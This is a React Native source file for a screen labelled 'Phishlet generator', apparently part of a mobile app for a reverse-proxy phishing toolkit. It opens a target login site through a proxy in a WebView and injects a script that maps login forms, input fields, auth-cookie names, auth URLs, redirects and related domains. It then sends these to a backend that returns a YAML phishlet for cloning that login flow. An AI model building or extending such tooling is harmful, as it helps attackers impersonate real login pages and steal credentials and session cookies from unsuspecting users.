import { LinearGradient } from "expo-linear-gradient";
import * as Clipboard from "expo-clipboard";
import { ExternalLink, Fingerprint, Globe, LinkIcon, Loader, Radar, Save, Scroll, Server, Wand2 } from "lucide-react-native";
import React, { useCallback, useMemo, useRef, useState } from "react";
import {
  ActivityIndicator,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import WebView from "react-native-webview";

import { theme } from "@/constants/theme";
import { useApiKey } from "@/hooks/useApiKey";
import { useGeneratePhishlet, useProxies } from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl } from "@/lib/api";

const CAPTURE_SCRIPT = `
(function() {
  'use strict';
  var PH = window.__phishletCapture || (window.__phishletCapture = {
    domains: [], urls: [], cookies: [], formFields: [],
    redirects: [], pageTitle: '', formAction: '', formMethod: '',
  });
  var AUTH_COOKIE_RE = /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf|_csrf|connect\\.sid|JSESSIONID|PHPSESSID)/i;

  function findBestForm() {
    // 1. Explicit <form> with password field.
    var forms = Array.from(document.querySelectorAll('form'));
    for (var i = 0; i < forms.length; i++) {
      if (forms[i].querySelector('input[type=password]')) return forms[i];
    }
    // 2. Any <form> with username-like input.
    for (var j = 0; j < forms.length; j++) {
      var inputs = forms[j].querySelectorAll('input');
      for (var k = 0; k < inputs.length; k++) {
        var n = (inputs[k].name || inputs[k].id || '').toLowerCase();
        if (/user|email|login|username|account/.test(n)) return forms[j];
      }
    }
    // 3. Fallback: first form on page.
    return forms[0] || null;
  }

  function collect() {
    var payload = {};

    // ── Page identity ──
    payload.pageTitle = document.title || '';

    // ── Form analysis ──
    var bestForm = findBestForm();
    if (bestForm) {
      payload.formAction = bestForm.action || location.href;
      payload.formMethod = (bestForm.method || 'get').toLowerCase();
    }

    // ── Input fields (all forms + loose inputs) ──
    var allInputs = Array.from(document.querySelectorAll('input, select, textarea'));
    var seen = {};
    var fields = [];
    allInputs.forEach(function(el) {
      var key = el.name || el.id || el.placeholder || el.type;
      if (!key || seen[key]) return;
      seen[key] = true;
      fields.push({
        name: el.name || '',
        type: (el.type || 'text').toLowerCase(),
        id: el.id || '',
        placeholder: el.placeholder || ''
      });
    });
    payload.formFields = fields;

    // ── Cookies (only auth-relevant ones) ──
    var rawCookies = document.cookie ? document.cookie.split(';') : [];
    var cookieNames = [];
    rawCookies.forEach(function(c) {
      var name = c.trim().split('=')[0].trim();
      if (name) cookieNames.push(name);
    });
    payload.cookies = cookieNames;
    // Also capture all cookies unconditionally for the metadata dump.
    payload.allCookies = cookieNames;

    // ── URLs ──
    payload.urls = [location.href];
    // Collect visible links that look like auth endpoints.
    Array.from(document.querySelectorAll('a[href]')).forEach(function(a) {
      var h = a.getAttribute('href') || '';
      if (/login|signin|auth|register|signup|account|oauth|sso|password|forgot/i.test(h)) {
        try { payload.urls.push(new URL(h, location.href).href); } catch(e) {}
      }
    });

    // ── Domains ──
    payload.domains = [location.hostname];
    // Scan page for absolute URLs pointing to other domains.
    Array.from(document.querySelectorAll('a[href], img[src], script[src], link[href], iframe[src]')).forEach(function(el) {
      var attr = el.getAttribute('href') || el.getAttribute('src') || '';
      var m = attr.match(/^https?:\\/\\/([^/?#]+)/i);
      if (m && m[1] !== location.hostname) payload.domains.push(m[1]);
    });

    // ── Current redirect (always snapshot where we are) ──
    payload.redirects = [location.href];

    // ── Merge into persistent store ──
    ['urls','cookies','formFields','redirects','domains'].forEach(function(k) {
      var existing = PH[k] || [];
      var incoming = payload[k] || [];
      // Merge arrays by value
      incoming.forEach(function(v) {
        var s = typeof v === 'string' ? v : JSON.stringify(v);
        if (PH._seen && PH._seen[k] && PH._seen[k][s]) return;
        if (!PH._seen) PH._seen = {};
        if (!PH._seen[k]) PH._seen[k] = {};
        PH._seen[k][s] = true;
        existing.push(v);
      });
      PH[k] = existing;
    });
    if (payload.pageTitle) PH.pageTitle = payload.pageTitle;
    if (payload.formAction) PH.formAction = payload.formAction;
    if (payload.formMethod) PH.formMethod = payload.formMethod;

    // Post the merged state.
    window.ReactNativeWebView && window.ReactNativeWebView.postMessage(JSON.stringify({
      urls: PH.urls,
      cookies: PH.cookies,
      formFields: PH.formFields,
      redirects: PH.redirects,
      domains: PH.domains,
      pageTitle: PH.pageTitle,
      formAction: PH.formAction,
      formMethod: PH.formMethod
    }));
  }

  // ── Intercept pushState / replaceState for SPA navigation ──
  (function(){
    var _ps = history.pushState, _rs = history.replaceState;
    history.pushState = function() { _ps.apply(this, arguments); setTimeout(collect, 800); };
    history.replaceState = function() { _rs.apply(this, arguments); setTimeout(collect, 800); };
    window.addEventListener('popstate', function() { setTimeout(collect, 800); });
  })();

  // ── Intercept form submissions and link clicks ──
  document.addEventListener('submit', function(e) {
    var f = e.target;
    if (f && f.tagName === 'FORM') {
      PH.formAction = f.action || location.href;
      PH.formMethod = (f.method || 'get').toLowerCase();
    }
    setTimeout(collect, 300);
  }, true);
  document.addEventListener('click', function(e) {
    var el = e.target;
    if (el && (el.tagName === 'BUTTON' || el.type === 'submit')) setTimeout(collect, 500);
  });

  // Initial sweep after DOM settles, then periodic.
  setTimeout(collect, 800);
  setTimeout(collect, 2500);
  setTimeout(collect, 5000);
})();
`;

export default function ReconScreen() {
  const insets = useSafeAreaInsets();
  const ah = useApiKey();
  const { data: proxies = [], isLoading, isError } = useProxies();
  const generate = useGeneratePhishlet(ah);

  const [selectedSlug, setSelectedSlug] = useState<string>("");
  const [captured, setCaptured] = useState<Record<string, unknown>>({});
  const [generated, setGenerated] = useState<string>("");
  const [activeUrl, setActiveUrl] = useState<string>("");
  const [webviewKey, setWebviewKey] = useState(0);

  const selected = useMemo(
    () => proxies.find((p) => p.slug === selectedSlug),
    [proxies, selectedSlug],
  );

  const start = useCallback(() => {
    if (!selected) return;
    setCaptured({});
    setGenerated("");
    const url = proxyUrl(selected.slug);
    setActiveUrl(url);
    setWebviewKey((k) => k + 1);
  }, [selected]);

  const onMessage = useCallback((event: { nativeEvent: { data?: string } }) => {
    try {
      const data = event.nativeEvent.data ? JSON.parse(event.nativeEvent.data) : {};
      setCaptured((prev) => {
        const merged: Record<string, unknown> = { ...prev };
        // Array fields — deduplicate and merge.
        for (const key of ["urls", "cookies", "formFields", "redirects", "domains"]) {
          const arr: unknown[] = data[key] ?? [];
          const existing = (merged[key] as unknown[]) ?? [];
          const seen = new Set(existing.map((v) => typeof v === "string" ? v : JSON.stringify(v)));
          for (const item of arr) {
            const s = typeof item === "string" ? item : JSON.stringify(item);
            if (!seen.has(s)) {
              seen.add(s);
              existing.push(item);
            }
          }
          merged[key] = existing;
        }
        // Scalar fields — last write wins.
        if (data.pageTitle) merged.pageTitle = String(data.pageTitle);
        if (data.formAction) merged.formAction = String(data.formAction);
        if (data.formMethod) merged.formMethod = String(data.formMethod);
        return merged;
      });
    } catch {
      // Ignore malformed messages.
    }
  }, []);

  const runGenerate = useCallback(() => {
    if (!selected) return;
    generate.mutate(
      {
        proxyId: selected.id,
        input: {
          targetUrl: selected.targetUrl,
          captured: {
            urls: (captured.urls as string[]) ?? [],
            cookies: (captured.cookies as string[]) ?? [],
            formFields: (captured.formFields as { name: string; type: string; id?: string; placeholder?: string }[]) ?? [],
            redirects: (captured.redirects as string[]) ?? [],
            domains: (captured.domains as string[]) ?? [],
            pageTitle: captured.pageTitle as string | undefined,
            formAction: captured.formAction as string | undefined,
            formMethod: captured.formMethod as string | undefined,
          },
        },
      },
      {
        onSuccess: (data) => setGenerated(data.phishlet),
      },
    );
  }, [generate, selected, captured]);

  return (
    <View style={styles.root}>
      <LinearGradient
        colors={[theme.colors.accentGlow, "transparent"]}
        start={{ x: 0.1, y: 0 }}
        end={{ x: 0.9, y: 0.5 }}
        style={styles.glow}
        pointerEvents="none"
      />
      <ScrollView
        contentContainerStyle={[
          styles.content,
          { paddingTop: insets.top + theme.spacing(6) },
        ]}
        showsVerticalScrollIndicator={false}
      >
        <View>
          <Text style={styles.eyebrow}>RECONNAISSANCE</Text>
          <Text style={styles.hero}>Phishlet generator</Text>
          <Text style={styles.sub}>
            Launch a controlled browser through a proxy target, capture login
            forms, cookies, and redirects, then generate a base YAML phishlet.
          </Text>
        </View>

        {isLoading ? (
          <ActivityIndicator color={theme.colors.accent} />
        ) : isError ? (
          <Text style={styles.errorText}>Could not load proxy targets.</Text>
        ) : proxies.length === 0 ? (
          <View style={styles.stateCard}>
            <Radar size={22} color={theme.colors.textFaint} />
            <Text style={styles.stateText}>
              Create a proxy target first to run reconnaissance.
            </Text>
          </View>
        ) : (
          <>
            <View style={styles.selector}>
              <Text style={styles.selectorLabel}>SELECT TARGET</Text>
              <View style={styles.selectorRow}>
                {proxies.map((p) => (
                  <Pressable
                    key={p.slug}
                    onPress={() => setSelectedSlug(p.slug)}
                    style={[
                      styles.selectorBtn,
                      selectedSlug === p.slug && styles.selectorBtnActive,
                    ]}
                  >
                    <Text
                      style={[
                        styles.selectorText,
                        selectedSlug === p.slug && styles.selectorTextActive,
                      ]}
                      numberOfLines={1}
                    >
                      {p.name || p.slug}
                    </Text>
                  </Pressable>
                ))}
              </View>
            </View>

            {selected && (
              <>
                <View style={styles.browserPanel}>
                  <View style={styles.browserHeader}>
                    <Text style={styles.browserUrl} numberOfLines={1}>
                      {activeUrl || "Browser not started"}
                    </Text>
                    <Pressable
                      onPress={start}
                      style={({ pressed }) => [
                        styles.launchBtn,
                        pressed && styles.pressed,
                      ]}
                    >
                      <ExternalLink size={14} color={theme.colors.bg} />
                      <Text style={styles.launchBtnText}>Launch browser</Text>
                    </Pressable>
                  </View>
                  {activeUrl ? (
                    <View style={styles.webviewWrap}>
                      <WebView
                        key={webviewKey}
                        source={{ uri: activeUrl }}
                        injectedJavaScript={CAPTURE_SCRIPT}
                        onMessage={onMessage}
                        style={styles.webview}
                        javaScriptEnabled
                        thirdPartyCookiesEnabled
                        domStorageEnabled
                      />
                    </View>
                  ) : (
                    <View style={styles.webviewPlaceholder}>
                      <Radar size={28} color={theme.colors.textFaint} />
                      <Text style={styles.placeholderText}>
                        Press Launch browser to open the target through the proxy.
                      </Text>
                    </View>
                  )}
                </View>

                <View style={styles.capturedCard}>
                  <View style={styles.capturedHeader}>
                    <Text style={styles.cardTitle}>Captured intelligence</Text>
                    {(captured.pageTitle || captured.formAction) ? (
                      <View style={styles.analysisBadge}>
                        <Fingerprint size={10} color={theme.colors.accent} />
                        <Text style={styles.analysisBadgeText}>Deep analysis</Text>
                      </View>
                    ) : null}
                  </View>
                  {captured.pageTitle ? (
                    <View style={styles.pageInfo}>
                      <Globe size={12} color={theme.colors.textFaint} />
                      <Text style={styles.pageInfoText} numberOfLines={1}>
                        {captured.pageTitle as string}
                      </Text>
                    </View>
                  ) : null}
                  {captured.formAction ? (
                    <View style={styles.formInfo}>
                      <Server size={12} color={theme.colors.textFaint} />
                      <Text style={styles.formInfoText} numberOfLines={1}>
                        {(captured.formMethod as string)?.toUpperCase() ?? "POST"} {(captured.formAction as string)}
                      </Text>
                    </View>
                  ) : null}
                  <View style={styles.metricRow}>
                    <Metric label="URLS" value={(captured.urls as string[])?.length ?? 0} />
                    <Metric label="FIELDS" value={(captured.formFields as unknown[])?.length ?? 0} />
                    <Metric label="DOMAINS" value={(captured.domains as string[])?.length ?? 0} />
                  </View>
                  <View style={styles.metricRow}>
                    <Metric label="COOKIES" value={(captured.cookies as string[])?.length ?? 0} />
                    <Metric label="AUTH" value={((captured.cookies as string[]) ?? []).filter((c: string) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf|connect\.sid|JSESSIONID|PHPSESSID)/i.test(c)).length} />
                    <Metric label="REDIRECTS" value={(captured.redirects as string[])?.length ?? 0} />
                  </View>
                  <Pressable
                    onPress={runGenerate}
                    disabled={generate.isPending}
                    style={({ pressed }) => [
                      styles.generateBtn,
                      pressed && styles.pressed,
                      generate.isPending && styles.generateBtnBusy,
                    ]}
                  >
                    {generate.isPending ? (
                      <Loader size={16} color={theme.colors.bg} />
                    ) : (
                      <Wand2 size={16} color={theme.colors.bg} />
                    )}
                    <Text style={styles.generateBtnText}>
                      {generate.isPending ? "Generating…" : "Generate phishlet YAML"}
                    </Text>
                  </Pressable>
                </View>

                {generated ? (
                  <View style={styles.yamlCard}>
                    <View style={styles.yamlHeader}>
                      <Text style={styles.cardTitle}>Generated phishlet</Text>
                      <View style={styles.yamlActions}>
                        <Pressable
                          onPress={() => {
                            Clipboard.setStringAsync(generated).then(() => {
                              // Simple haptic-like feedback — silent copy.
                            }).catch(() => {});
                          }}
                          style={styles.copyBtn}
                        >
                          <Scroll size={12} color={theme.colors.accent} />
                          <Text style={styles.copyBtnText}>Copy YAML</Text>
                        </Pressable>
                        <View style={styles.savedBadge}>
                          <Save size={12} color={theme.colors.ok} />
                          <Text style={styles.savedText}>Saved</Text>
                        </View>
                      </View>
                    </View>
                    <ScrollView horizontal style={styles.yamlScroll} showsHorizontalScrollIndicator={false}>
                      <Text style={styles.yaml}>{generated}</Text>
                    </ScrollView>
                  </View>
                ) : null}
              </>
            )}
          </>
        )}
      </ScrollView>
    </View>
  );
}

function Metric({ label, value }: { label: string; value: number }) {
  return (
    <View style={styles.metric}>
      <Text style={styles.metricValue}>{value}</Text>
      <Text style={styles.metricLabel}>{label}</Text>
    </View>
  );
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: theme.colors.bg },
  glow: { position: "absolute", top: 0, left: 0, right: 0, height: 280 },
  content: {
    paddingHorizontal: theme.spacing(5),
    paddingBottom: theme.spacing(12),
    gap: theme.spacing(5),
  },
  eyebrow: {
    color: theme.colors.accent,
    fontSize: 12,
    fontWeight: "700",
    letterSpacing: 2,
    fontFamily: theme.font.mono,
  },
  hero: {
    color: theme.colors.text,
    fontSize: 28,
    fontWeight: "800",
    letterSpacing: -0.5,
    marginTop: theme.spacing(1),
  },
  sub: {
    color: theme.colors.textDim,
    fontSize: 14,
    lineHeight: 21,
    marginTop: theme.spacing(2),
  },
  errorText: {
    color: theme.colors.danger,
    fontSize: 14,
    fontFamily: theme.font.mono,
  },
  stateCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(6),
    gap: theme.spacing(3),
    alignItems: "center",
  },
  stateText: {
    color: theme.colors.textDim,
    fontSize: 14,
    textAlign: "center",
  },
  selector: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(2),
  },
  selectorLabel: {
    color: theme.colors.textFaint,
    fontSize: 11,
    fontWeight: "700",
    letterSpacing: 1,
    fontFamily: theme.font.mono,
  },
  selectorRow: {
    flexDirection: "row",
    flexWrap: "wrap",
    gap: theme.spacing(2),
  },
  selectorBtn: {
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  selectorBtnActive: {
    backgroundColor: "rgba(255,178,62,0.12)",
    borderColor: theme.colors.warn,
  },
  selectorText: {
    color: theme.colors.textDim,
    fontSize: 12,
    fontWeight: "600",
    fontFamily: theme.font.mono,
  },
  selectorTextActive: {
    color: theme.colors.warn,
  },
  browserPanel: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    overflow: "hidden",
    gap: theme.spacing(2),
  },
  browserHeader: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    paddingHorizontal: theme.spacing(4),
    paddingVertical: theme.spacing(3),
    gap: theme.spacing(2),
    borderBottomWidth: 1,
    borderBottomColor: theme.colors.border,
  },
  browserUrl: {
    flex: 1,
    color: theme.colors.text,
    fontSize: 12,
    fontFamily: theme.font.mono,
  },
  launchBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1.5),
    backgroundColor: theme.colors.accent,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
    borderRadius: theme.radius.sm,
  },
  launchBtnText: {
    color: theme.colors.bg,
    fontSize: 12,
    fontWeight: "700",
  },
  webviewWrap: {
    height: 360,
    backgroundColor: theme.colors.bg,
    marginHorizontal: theme.spacing(2),
    marginBottom: theme.spacing(2),
    borderRadius: theme.radius.sm,
    overflow: "hidden",
  },
  webview: { flex: 1 },
  webviewPlaceholder: {
    height: 220,
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(3),
    marginHorizontal: theme.spacing(2),
    marginBottom: theme.spacing(2),
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    borderStyle: "dashed",
  },
  placeholderText: {
    color: theme.colors.textDim,
    fontSize: 13,
    textAlign: "center",
    paddingHorizontal: theme.spacing(6),
  },
  capturedHeader: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
  },
  analysisBadge: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: "rgba(255,178,62,0.10)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(255,178,62,0.25)",
    paddingHorizontal: theme.spacing(2),
    paddingVertical: 2,
  },
  analysisBadgeText: {
    color: theme.colors.accent,
    fontSize: 9,
    fontWeight: "700",
    fontFamily: theme.font.mono,
  },
  pageInfo: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  pageInfoText: {
    color: theme.colors.textDim,
    fontSize: 11,
    fontFamily: theme.font.mono,
    flex: 1,
  },
  formInfo: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    paddingHorizontal: theme.spacing(3),
    paddingVertical: theme.spacing(2),
  },
  formInfoText: {
    color: theme.colors.textDim,
    fontSize: 11,
    fontFamily: theme.font.mono,
    flex: 1,
  },
  capturedCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(4),
  },
  cardTitle: {
    color: theme.colors.text,
    fontSize: 14,
    fontWeight: "700",
  },
  metricRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    gap: theme.spacing(2),
  },
  metric: {
    flex: 1,
    backgroundColor: theme.colors.bgElevated,
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(3),
    alignItems: "center",
  },
  metricValue: {
    color: theme.colors.text,
    fontSize: 20,
    fontWeight: "800",
    fontFamily: theme.font.mono,
  },
  metricLabel: {
    color: theme.colors.textFaint,
    fontSize: 10,
    fontWeight: "700",
    letterSpacing: 0.5,
    fontFamily: theme.font.mono,
    marginTop: theme.spacing(1),
  },
  generateBtn: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: theme.spacing(2),
    backgroundColor: theme.colors.warn,
    paddingVertical: theme.spacing(3),
    borderRadius: theme.radius.md,
  },
  generateBtnBusy: { opacity: 0.7 },
  generateBtnText: {
    color: theme.colors.bg,
    fontSize: 14,
    fontWeight: "800",
  },
  yamlCard: {
    backgroundColor: theme.colors.surface,
    borderRadius: theme.radius.md,
    borderWidth: 1,
    borderColor: theme.colors.border,
    padding: theme.spacing(4),
    gap: theme.spacing(3),
  },
  yamlHeader: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
  },
  savedBadge: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: "rgba(34,197,94,0.10)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(34,197,94,0.35)",
    paddingHorizontal: theme.spacing(2),
    paddingVertical: theme.spacing(1),
  },
  savedText: {
    color: theme.colors.ok,
    fontSize: 11,
    fontWeight: "700",
  },
  yamlScroll: { marginTop: theme.spacing(1) },
  yaml: {
    color: theme.colors.text,
    fontSize: 11,
    fontFamily: theme.font.mono,
    lineHeight: 17,
  },
  yamlActions: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(2),
  },
  copyBtn: {
    flexDirection: "row",
    alignItems: "center",
    gap: theme.spacing(1),
    backgroundColor: "rgba(255,178,62,0.10)",
    borderRadius: theme.radius.sm,
    borderWidth: 1,
    borderColor: "rgba(255,178,62,0.25)",
    paddingHorizontal: theme.spacing(2),
    paddingVertical: theme.spacing(1),
  },
  copyBtnText: {
    color: theme.colors.accent,
    fontSize: 11,
    fontWeight: "700",
  },
  pressed: { opacity: 0.55 },
});
